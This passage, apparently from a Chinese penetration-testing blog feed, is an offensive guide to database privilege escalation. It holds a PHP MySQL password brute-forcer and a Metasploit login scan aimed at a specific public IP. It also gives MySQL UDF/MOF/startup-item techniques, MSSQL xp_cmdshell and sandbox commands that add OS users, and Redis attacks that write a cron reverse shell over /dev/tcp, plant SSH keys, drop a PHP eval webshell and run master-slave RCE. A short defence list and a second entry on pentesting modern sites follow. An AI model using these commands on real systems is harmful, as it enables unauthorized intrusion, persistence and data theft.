feof($file))&#123;</span><br><span class="line">$password[$i] = fgets($file);</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">    echo &quot;&lt;hr&gt;&lt;br&gt;-----------------------爆破状态-----------------------&lt;br&gt;&quot;;</span><br><span class="line">    for ($l=0; $l &lt;= count($password); $l++) &#123;</span><br><span class="line">$password1 = trim($password[$l]);//除去左右空白</span><br><span class="line">if(@mysql_connect($host, $username, $password1))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#x27;数据库密码为：&#123;$password1&#125;&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&#x27;red&#x27;&gt;爆破成功--密码--&gt;&quot;.@$password1.&quot;&lt;/font&gt;&quot;;</span><br><span class="line">break;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;----------------------爆破结束-----------------------&lt;br&gt;&lt;hr&gt;&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;黑客，输入数据库IP地址&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;form action=&quot;Completion.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">   数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>支持外联</strong>：远程本地暴力破解，服务器本地破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set rhost 47.99.71.28</span><br><span class="line">set username root</span><br><span class="line">set pass_file /opt/mysql_pwd.txt</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li><li><p>目前数据库提权对应的技术以及方法</p></li></ol><h3 id="数据库端口号"><a class="markdownIt-Anchor" href="#数据库端口号"></a> 数据库端口号</h3><p><strong>关系型</strong></p><table><thead><tr><th>类型</th><th>数据库</th><th>默认端口</th></tr></thead><tbody><tr><td><strong>关系型</strong></td><td><strong>Oracle</strong></td><td><strong>1521</strong></td></tr><tr><td></td><td><strong>Sql server</strong></td><td><strong>1433</strong></td></tr><tr><td></td><td><strong>Mysql</strong></td><td><strong>3306</strong></td></tr><tr><td></td><td>Pointbase</td><td>9092</td></tr><tr><td></td><td><strong>Db2</strong></td><td><strong>50000</strong></td></tr><tr><td></td><td>Sybase</td><td>5000</td></tr><tr><td></td><td><strong>PostgreSQL</strong></td><td><strong>5432</strong></td></tr><tr><td><strong>非关系型</strong></td><td>MongoDB</td><td>27017</td></tr><tr><td></td><td><strong>Redis</strong></td><td><strong>6379</strong></td></tr><tr><td></td><td>memcached</td><td>11211</td></tr></tbody></table><h3 id="mysqludfmof启动项反弹shell"><a class="markdownIt-Anchor" href="#mysqludfmof启动项反弹shell"></a> Mysql（UDF/MOF/启动项/反弹shell）</h3><h4 id="文件存储方式"><a class="markdownIt-Anchor" href="#文件存储方式"></a> 文件存储方式</h4><p>存储数据的目录是<code>Mysql/data/数据库名/表名.myd</code>，里面有表里的数据。而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到，我们可以在<code>Mysql/data/mysql/user.myd</code>中找到该文件！</p><h4 id="udf"><a class="markdownIt-Anchor" href="#udf"></a> UDF</h4><blockquote><p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p><p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p></blockquote><p>前提是：得到数据库的账号密码（root），先导出dll，导出目录必须可以加载dll文件（secure_file_priv项设置为空），然后我们再执行命令。需要注意的问题，<strong>识别Mysql的版本</strong></p><ol><li>小于5.1：导出目录：<code>c:/windows</code>或<code>system32</code></li><li>大于等于5.1：导出安装目录<code>/lib/plugin</code>（这个<code>plugin</code>目录需要自己建立或者利用NTFS流创建）</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>怎么判定版本</strong>：<code>select @@version</code></p><p><strong>怎么找到目录</strong>：<code>select @@basedir</code>，<code>show variables like ‘%plugins%’</code></p><p><strong>怎么快速操作</strong>：</p><ol><li><p>例如，我们知道了目录为：<code>c:/mysql/</code>，版本为5.5.3，则在<code>mysql/lib</code>下创建目录，有：<code>mysql/lib/plugin</code></p></li><li><p>设置secure_file_priv项为空（my.ini）</p></li><li><p>我们有一个dll，将至上传（安装）到该目录下。就可以执行了。</p></li><li><p>过程中我们需要上传一个webshell到服务器上，然后再攻击。这个webshell可以是大马也可以是专门的mysql.php脚本。</p><ol><li><p>如果没有webshell，那就<strong>使用dumpfile通过16进制数据流写入udf文件</strong>。（当然可以Loadfile）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x4d5a900..... into dump file &quot;C:\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p><p>流程是：<strong>创建表+insert+update concat+dumpfile</strong></p><p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p></li></ol></li></ol><p>相关问题：</p><ol><li>函数已存在： Function ‘sys_eval’ already exists。可以直接调用就调用，没办法的话就删了重新添加，如果存在但是用不了，那就重启数据库，然后重新创建。</li><li>位数不对：Can’t open shared library ‘udf.dll’ (errno: 193 )。更换32/64位</li></ol><p>参考：</p><ol><li><a href="https://www.freebuf.com/articles/database/291175.html">https://www.freebuf.com/articles/database/291175.html</a></li><li>可以在上面的linux提权那里看一些操作</li></ol><h4 id="mof"><a class="markdownIt-Anchor" href="#mof"></a> MOF</h4><p>成功率最低。MOF是windows中的一个文件，可以每隔5秒监控进程创建和死亡。如果我们替换这个文件，那么我们就可执行我们上传的mod，其中有一段是vbs脚本，所以可以运行cmd命令，一般是<strong>添加用户</strong>（以mysql-root权限）。</p><ul><li>导出自定义 mof 文件到系统目录加载</li><li>同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv=</li></ul><p>所以流程如下：</p><ol><li>准备一个mof文件，以及前置条件，例如root权限，目录可写等等。</li><li>使用<code>select load_file(...) into dumpfile &quot;c:/mysql...&quot;</code>，替换mof。</li><li>过一会就可以了。</li></ol><p>参考：<a href="https://blog.csdn.net/Zlirving_/article/details/106618559">https://blog.csdn.net/Zlirving_/article/details/106618559</a></p><h4 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h4><ul><li><strong>（基于配合操作系统自启动）</strong></li><li>导出自定义可执行文件到启动目录配合重启执行</li><li>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</li></ul><p>我们需要开启外联（大马里有相关命令）<code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' INDENTIFIED BY 'root' WITH GRANT OPTION;</code>（执行这个当然需要root权限）</p><p>流程如下：</p><ol><li><p>要么～使用msf中的mysql_start_up模块提升权限即可</p></li><li><p>要么～上传bat文件：将创建好的bat文件进行服务器启动项写入，配合重启执行！ bat文件实例。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">net</span> user xxx <span class="number">123</span>!@#ws /add</span><br></pre></td></tr></table></figure></li><li><p>使用DDoS，让服务器重启！</p></li></ol><h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h4><ul><li><p><code>nc -l -p 5577</code></p></li><li><p>nc相关知识：<a href="https://www.cnblogs.com/-chenxs/p/11748488.html">https://www.cnblogs.com/-chenxs/p/11748488.html</a></p></li></ul><p>流程如下：</p><ol><li>要么自己创建反弹函数</li><li>要么使用mysql.php创建一个反弹函数backdoor。</li></ol><h3 id="mssql"><a class="markdownIt-Anchor" href="#mssql"></a> MSSQL</h3><p>特点：</p><ol><li>默认支持外联</li></ol><h4 id="xp_cmdshell"><a class="markdownIt-Anchor" href="#xp_cmdshell"></a> xp_cmdshell</h4><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。</p><p>当我们使用这个函数执行命令的时候会提示：<strong>访问组件xp_cmdshell过程被阻止</strong></p><p>则我们需要开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure><h4 id="sp_oacreate-提权"><a class="markdownIt-Anchor" href="#sp_oacreate-提权"></a> sp_oacreate 提权</h4><p>主要是用来调用 OLE 对象，利用 OLE 对象的 run 方法执行系统命令。同样，他会默认关闭，遇到和xp_cmdshell一样的问题，则打开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure><p>使用（<em>注意，我们需要对输出结果重定向，不然可能输出不出来，后面我们用webshell看就好了</em>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt; c:\\1.txt&#x27;</span><br></pre></td></tr></table></figure><h4 id="沙盒提权"><a class="markdownIt-Anchor" href="#沙盒提权"></a> 沙盒提权</h4><p>参考资料：<a href="https://blog.51cto.com/11797152/2411770">https://blog.51cto.com/11797152/2411770</a></p><p>按照步骤来就好</p><ol><li><p>提权语句（show advanced options设置为1就是可以更改配置）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure><p>不开启的话在执行 xp_regwrite 会提示让我们开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,1;</span><br><span class="line">reconfigure;</span><br></pre></td></tr></table></figure></li><li><p>关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_regwrite</span><br><span class="line">&#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,0;</span><br></pre></td></tr></table></figure></li><li><p>查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.xp_regread &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,</span><br><span class="line">&#x27;SandBoxMode&#x27;</span><br></pre></td></tr></table></figure></li><li><p>执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from</span><br><span class="line">openrowset(&#x27;microsoft.jet.oledb.4.0&#x27;,&#x27;;database=c:/windows/system32/ias/ias.mdb&#x27;,&#x27;select shell(&quot;net user margin margin /add&quot;)&#x27;)</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>沙盒模式SandBoxMode参数含义（默认是2）</p><p><code>0</code>：在任何所有者中禁止启用安全模式<br /><code>1</code>：为仅在允许范围内<br /><code>2</code>：必须在access模式下<br /><code>3</code>：完全开启</p><p>openrowset是可以通过OLE DB访问SQL Server数据库，OLE  DB是应用程序链接到SQL Server的的驱动程序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--</span><br><span class="line">恢复配置（暂不执行）</span><br><span class="line">--</span><br><span class="line">exec master..xp_regwrite &#x27;HKEY_LOCAL_MACHINE&#x27;,&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;,&#x27;SandBoxMode&#x27;,&#x27;REG_DWORD&#x27;,1;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;Ad Hoc Distributed Queries&#x27;,0;reconfigure;</span><br><span class="line">--</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;,0;reconfigure;</span><br></pre></td></tr></table></figure></blockquote><h3 id="oracle"><a class="markdownIt-Anchor" href="#oracle"></a> ORACLE</h3><p>测试：</p><ol><li>普通用户模式：拥有一个普通用户权限，可提权至DBA，并以oracle实例运行的权限执行操作系统命令</li><li>DBA用户模式：拥有DBA账户密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试</li><li>注入提升模式：拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</li></ol><p>注：</p><ul><li>jsp网站后门不用提权，默认就是system权限</li></ul><h4 id="oracle工具提权"><a class="markdownIt-Anchor" href="#oracle工具提权"></a> Oracle工具提权</h4><p>先使用sqlmap扫一下看是不是存在注入点，然后用rebeyond的工具干就完事了。</p><h3 id="redis"><a class="markdownIt-Anchor" href="#redis"></a> Redis</h3><p>Redis未授权漏洞：可以以root运行+使用内置指令+写入ssh密钥</p><p>常用指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 链接数据库</span><br><span class="line">redis-cli -h &lt;ip&gt; -p 6397 -a &lt;passwd&gt;</span><br><span class="line"># 查看信息</span><br><span class="line">info</span><br><span class="line"># 设置变量/获取变量</span><br><span class="line">set x &quot;test&quot;</span><br><span class="line">get x</span><br><span class="line"># 删除数据库</span><br><span class="line">flushall</span><br><span class="line"># 设置主从关系</span><br><span class="line">slaveof ip port</span><br></pre></td></tr></table></figure><h4 id="计划任务反弹shell"><a class="markdownIt-Anchor" href="#计划任务反弹shell"></a> 计划任务反弹shell</h4><p>计划任务（路径：<code>/var/spool/cron</code>）。执行命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.80.137</span><br><span class="line">set  x   &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.80.137/5555 0&gt;&amp;1\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注意改一下IP端口就可以了，在自己的主机上：<code>nc -l -p 5555</code></p><h4 id="写入ssh-keygen"><a class="markdownIt-Anchor" href="#写入ssh-keygen"></a> 写入ssh-keygen</h4><p>条件：</p><ol><li>以root启动</li><li>开放ssh服务</li><li>未授权</li></ol><p>流程：</p><ol><li>在攻击机生成一个公钥文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/        #如果.ssh不存在的话,创建.ssh文件夹。</span><br><span class="line">ssh-keygen -t rsa     #执行完命令然后回车三次就结束了。</span><br><span class="line">cat id_rsa.pub</span><br></pre></td></tr></table></figure><ol start="2"><li>未授权或者弱口令访问redis服务，并写入公钥：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis -h 192.168.223.132      登录redis服务</span><br><span class="line">config set dir /root/.ssh/    #设置保存路径</span><br><span class="line">config set dbfilename authorized_keys    #设置保存文件名</span><br><span class="line">set x &quot;\n\n\n ??? \n\n\n&quot;    #将公钥写入x键，用&quot;\n\n\n&quot;包裹住公钥，并且跟公钥之间用空格隔开</span><br><span class="line">save    # 保存</span><br></pre></td></tr></table></figure><ol start="3"><li>用私钥进行登录：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa    #第一次登陆需要输入yes</span><br></pre></td></tr></table></figure><h4 id="主从复制"><a class="markdownIt-Anchor" href="#主从复制"></a> 主从复制</h4><p>为了缓解数据库压力，redis使用两个服务器，一个负责读一个负责写，来减轻流量压力。在两个redis服务器设置主从模式的时候，主机实例可以通过<code>FULLRESYNC</code>指令同步文件在从机实例上，然后在从机上加载。</p><p>如果同步了恶意so文件，则从机加载该文件，我们主机就可以执行拓展命令。</p><p>条件：</p><ol><li>服务器允许与其他IP发起TCP请求</li><li>允许主从复制</li><li>版本：4.x-5.0.5（可以编译so文件）</li></ol><p>流程：</p><ol><li>攻击机对受害机：<code>slaveof ip port</code></li><li>使用Redis-RCE工具获取受害机的反弹shell（使用nc模拟Redis主服务器，进行模拟Redis主从交互过程）</li></ol><p>实现：</p><ol><li><p>生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></li><li><p>攻击端执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.so</span><br><span class="line"></span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>参考：</p><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a></p><h4 id="低权限写入webshell"><a class="markdownIt-Anchor" href="#低权限写入webshell"></a> 低权限写入webshell</h4><p>流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# redis-cli -h 192.168.223.132</span><br><span class="line">192.168.223.132:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; set x &quot;&lt;?php eval(@$_POST[&#x27;a&#x27;]); ?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.223.132:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h4 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h4><ol><li>绑定需要访问数据库IP，将127.0.0.1修改为需要访问该数据库的IP</li><li>修改帐号密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。</li><li>低权限运行Redis</li><li>禁止使用帐号密码登录</li></ol><h3 id="postgresql"><a class="markdownIt-Anchor" href="#postgresql"></a> PostgreSql</h3><p>PostgreSQL 是一款关系型数据库。其 9.3 到 11 版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。 提权利用的是一下漏洞。流程为：连接-利用漏洞-执行-提权。</p><p>判断权限去应用以下漏洞：一般名字为PostgreSql的用户就是高权限</p><h4 id="cve-2018-1058"><a class="markdownIt-Anchor" href="#cve-2018-1058"></a> CVE-2018-1058</h4><p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。（低权限用户用这个）</p><h4 id="cve-2019-9193"><a class="markdownIt-Anchor" href="#cve-2019-9193"></a> CVE-2019-9193</h4><p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。（高权限提权）</p><h1 id="其他权限提升"><a class="markdownIt-Anchor" href="#其他权限提升"></a> 其他权限提升</h1><h2 id="服务类"><a class="markdownIt-Anchor" href="#服务类"></a> 服务类</h2><ol><li>FTP</li><li>RDP</li><li>SSH</li></ol><h2 id="第三方接口"><a class="markdownIt-Anchor" href="#第三方接口"></a> 第三方接口</h2><ol><li>支付</li><li>邮件</li></ol><h1 id="其他资源"><a class="markdownIt-Anchor" href="#其他资源"></a> 其他资源</h1><h2 id="复现注意"><a class="markdownIt-Anchor" href="#复现注意"></a> 复现注意</h2><ol><li>搭建数据库后要看防火墙是否把端口给拦截了，是的话重新开启</li></ol><h2 id="大马编写"><a class="markdownIt-Anchor" href="#大马编写"></a> 大马编写</h2><p><a href="https://blog.csdn.net/qq_53079406/article/details/125038306">https://blog.csdn.net/qq_53079406/article/details/125038306</a></p><h1 id="思维导图"><a class="markdownIt-Anchor" href="#思维导图"></a> 思维导图</h1><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/68747470733a2f2f67697465652e636f6d2f736d616c6c2d6c656563682d736872696d702f7479706f72615f7069632f7261772f6d61737465722f36342e706e67.png" alt="img" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h1&gt;
&lt;p&gt;一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="提权" scheme="https://j3f5.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试需要注意的点</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/</id>
    <published>2023-06-14T01:08:03.000Z</published>
    <updated>2023-06-14T01:08:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>首先定义本文所说的现代化网站。 现代化网站是指符合以下多个特征的对外服务。</p><ul><li>储存，数据库，网站程序等服务器高度分离</li><li>实现现代化前端技术， 如三大框架， html5新api， websocket</li><li>基于虚拟化技术的服务部署</li><li>使用现代后端框架，如ssm，think5，gin，django</li><li>外部服务高度集成</li><li>多种客户端，包括Android，Ios，windows</li></ul><p>篇幅有限， 不再列举，但相信读者应该能理解笔者的意思。</p><p>不属于现代化网站最典型的例子就是 下载cms，安装lnmp，直接安装网站程序。现在渗透教程基本都是基于不属于现代化网站的假设。</p><p>参考：<a href="https://blue-bird1.github.io/posts/newsitethink/">https://blue-bird1.github.io/posts/newsitethink/</a></p><h1 id="cdn反向代理"><a class="markdownIt-Anchor" href="#cdn反向代理"></a> CDN/反向代理</h1><p>使用了CDN将会隐藏真实IP， 导致常规端口扫描，弱口令扫描全部失效。但可以通过寻找真实ip来解决。反向代理则无解， 甚至可能只把代理服务器暴露于公网。敏感服务全在内网</p><p>对绕过CDN这个问题， 已经有了一定的研究。有了安全工具， 如<a href="https://github.com/Tai7sy/fuckcdn">fuckcdn</a></p><h1 id="数据分离"><a class="markdownIt-Anchor" href="#数据分离"></a> 数据分离</h1><p>上传文件服务器分离，将导致上传webshell技术失效， 很显然文件服务器是不可能执行webshell的。 上传危害最多只能达到上传html</p><h1 id="websocket"><a class="markdownIt-Anchor" href="#websocket"></a> websocket</h1><p>之所以专门把websocket作为一点， 是因为感觉websocket属于盲区， burp，浏览器均不支持websocket的渗透测试。</p><h1 id="新的h5-api"><a class="markdownIt-Anchor" href="#新的h5-api"></a> 新的h5 api</h1><p>html5提供了新的api，但是这方面的安全问题还没有被开发人员重视。这个可以从hackone平台上的漏洞报告看出。例如<a href="https://hackerone.com/reports/398054">DOM Based XSS in www。hackerone。com via PostMessage</a> 。</p><p><code>postmessage</code>这类api的输入是不可控的，如果不进行控制， 就是安全问题。</p><h1 id="前后端分离"><a class="markdownIt-Anchor" href="#前后端分离"></a> 前后端分离</h1><p>使用三大框架(vue，react， angular)的前端， 对后端进行分离。 也就是不再将url参数直接渲染到html，而通过JavaScript操作。反射行xss全部失效，常规储存xss在框架的安全性下也变得渺茫。<strong>JavaScript操作带来的xss反而变为主流</strong>。这也对渗透测试人员阅读JavaScript代码带来了挑战，也带来了部分好处，由于在前端操作，后端暴露的接口将会更多。</p><h1 id="后端框架"><a class="markdownIt-Anchor" href="#后端框架"></a> 后端框架</h1><p>应用了框架后，简单注入全部失效，csrf部分失效， <code>id=x</code>这种低级注入消失。出现注入的点趋向<strong>二次注入</strong>， <strong>编码注入</strong>。 sqlmap是不提供原生支持的，所以一般都没用了，只适合找老漏洞。</p><h2 id="外部服务接入"><a class="markdownIt-Anchor" href="#外部服务接入"></a> 外部服务接入</h2><p>对某些功能不自行进行开发，使用其他公司的服务。这部分功能的安全性取决与该公司的安全水平， 不过真挖出漏洞就属于通用0day了。由于对接入服务的理解，接入处反而容易出现问题， 比如未预料的异常。</p><blockquote><p>接入开发: ???，这个问题你怎么不在服务上处理。</p><p>服务开发: 